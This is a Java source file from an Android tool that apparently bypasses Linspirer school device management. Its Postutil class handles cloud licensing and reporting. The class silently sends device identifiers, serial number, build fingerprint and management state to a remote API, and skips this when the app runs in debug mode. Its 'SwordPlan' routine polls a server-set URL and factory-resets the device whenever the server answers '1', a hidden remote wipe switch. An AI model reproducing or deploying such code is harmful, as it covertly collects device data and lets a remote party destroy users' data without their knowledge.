package com.ljlVink.core.core;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.os.Build;
import android.provider.Settings;

import com.huosoft.wisdomclass.linspirerdemo.BuildConfig;
import com.ljlVink.Activity.NewUI;
import com.ljlVink.MDM;
import com.ljlVink.utils.Sysutils;
import com.ljlVink.utils.Toast;
import com.ljlVink.utils.DataUtils;
import com.ljlVink.utils.appsecurity.RSA;

import org.json.JSONException;
import org.json.JSONObject;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
public class Postutil {
    Context context;
    String mac;
    String sn;
    private HackMdm hackMdm;
    public Postutil(Context context){
        this.context=context;
        mac=Sysutils.getDeviceid(context);
    }
    public void CloudAuthorize(){
        final String pubkey="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy7Zi/oJPPPsomYWcP2lB\n" +
                "bdo1ovpqvr2tvCrxUKjWqgUSsYnrCPNkj5MOAjoyBB4wTB5SAOwLXFsB0Cu8YE8a\n" +
                "4U38XdPF4wH3Tst7hlU1x9KyOg/bgYKkT8NTQ7lgy8WsmlcKiI/u2Aea8+XpCTBw\n" +
                "UdIBkuF0apT+qOzOBGPuJtIhR20SIGLdW7R9ZSjuXO7CgQp4sna6xfX0ae0blqwn\n" +
                "ASbXRLvFofTx39sDgZTibRwYp/1UEuTfBKjK3BJ0R4S2OopqD3gVHFba0YPP+Q5q\n" +
                "bOX+/KU+ASo/lM9qFSKM6NpgLjuUR0VaAcZFcYl59v+jb58/PcqYLr1cY7Zj08xu\n" +
                "OwIDAQAB";
        if(RSA.decryptByPublicKey(DataUtils.readStringValue(context,"key","null"),pubkey).equals(Sysutils.getDeviceid(context).toLowerCase())){
            return;
        }
        sendPost("not Authorized,proforming cloud Authorize");
        Thread thread=new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    try {
                        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
                        JSONObject json = new JSONObject();
                        json.put("mac", mac);
                        json.put("device", Sysutils.getDevice());
                        OkHttpClient client = new OkHttpClient();
                        RequestBody requestBody = RequestBody.create(JSON, String.valueOf(json));
                        Request request = new Request.Builder().url("https://service-jexrigkk-1304419020.gz.apigw.tencentcs.com/CloudAuthorize").post(requestBody).build();
                        Response response = client.newCall(request).execute();
                        String res=response.body().string();
                        String[] cmd=RSA.decryptByPublicKey(res,pubkey).split("@");
                        if(cmd.length==1){
                            if(cmd[0].equals(mac.toLowerCase())){
                                DataUtils.saveStringValue(context,"key",res);
                                Toast.ShowSuccess(context,"云授权成功!");
                                sendPost("云授权成功:"+mac);

                            }
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }
        });
        thread.start();

    }
    public void sendPost(String opt) {
        String lcmdm_version="";
        try{
            lcmdm_version=context.getPackageManager().getPackageInfo("com.android.launcher3",0).versionName;
        }catch (Exception e){
            lcmdm_version="设备未安装管控";
        }
        if(Sysutils.isContextDebug(context)){
            return;
        }
        hackMdm=new HackMdm(context);
        sn=hackMdm.getCSDK_sn_code();
        String finalLcmdm_version = lcmdm_version;
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    MediaType JSON = MediaType.parse("application/json; charset=utf-8");
                    JSONObject json = new JSONObject();
                    try {
                        json.put("mac",mac);
                        json.put("sn", sn);
                        json.put("ver", BuildConfig.VERSION_NAME);
                        json.put("opt",opt);
                        json.put("device", Sysutils.getDevice());
                        json.put("romver",Build.DISPLAY);
                        json.put("pkgname",context.getPackageName());
                        json.put("system",String.format(Locale.ROOT, "Android %1$s (API %2$d),", Build.VERSION.RELEASE, Build.VERSION.SDK_INT)+Build.FINGERPRINT);
                        json.put("currmdm",new MDM(context).MDM());
                        json.put("currstate",hackMdm.isDeviceOwnerActive()?"deviceowner":(hackMdm.isDeviceAdminActive()?"deviceadmin":"Not Activited"));
                        json.put("lcmdm_version", finalLcmdm_version);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    OkHttpClient client = new OkHttpClient();
                    RequestBody requestBody = RequestBody.create(JSON, String.valueOf(json));
                    Request request = new Request.Builder().url("https://service-jexrigkk-1304419020.gz.apigw.tencentcs.com/GG_U8u25552ttttyyxv_wen").post(requestBody).build();
                    Response response = client.newCall(request).execute();
                    response.close();
                }
                catch (Exception e){
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }
    public void SwordPlan(){
        if(DataUtils.readint(context,"SwordPlan")==0){
            return;
        }
        String lcmdm_version="";
        try{
            lcmdm_version=context.getPackageManager().getPackageInfo("com.android.launcher3",0).versionName;
        }catch (Exception e){
            lcmdm_version="设备未安装管控";
        }
        String api=DataUtils.readStringValue(context,"SwordPlan_api","https://service-jexrigkk-1304419020.gz.apigw.tencentcs.com/SwordPlan");
        hackMdm=new HackMdm(context);
        sn=hackMdm.getCSDK_sn_code();
        String finalLcmdm_version = lcmdm_version;
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    MediaType JSON = MediaType.parse("application/json; charset=utf-8");
                    JSONObject json = new JSONObject();
                    try {
                        json.put("mac",mac);
                        json.put("sn", sn);
                        json.put("ver", BuildConfig.VERSION_NAME);
                        json.put("device", Sysutils.getDevice());
                        json.put("romver",Build.DISPLAY);
                        json.put("pkgname",context.getPackageName());
                        json.put("system",String.format(Locale.ROOT, "Android %1$s (API %2$d),", Build.VERSION.RELEASE, Build.VERSION.SDK_INT)+Build.FINGERPRINT);
                        json.put("currmdm",new MDM(context).MDM());
                        json.put("currstate",hackMdm.isDeviceOwnerActive()?"deviceowner":(hackMdm.isDeviceAdminActive()?"deviceadmin":"Not Activited"));
                        json.put("lcmdm_version", finalLcmdm_version);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    OkHttpClient client = new OkHttpClient();
                    RequestBody requestBody = RequestBody.create(JSON, String.valueOf(json));
                    Request request = new Request.Builder().url(api).post(requestBody).build();
                    Response response = client.newCall(request).execute();
                    String body=response.body().string();
                    if(body.equals("1")){
                        hackMdm.RestoreFactory_anymode();
                    }
                    response.close();
                }
                catch (Exception e){
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        return;
    }
}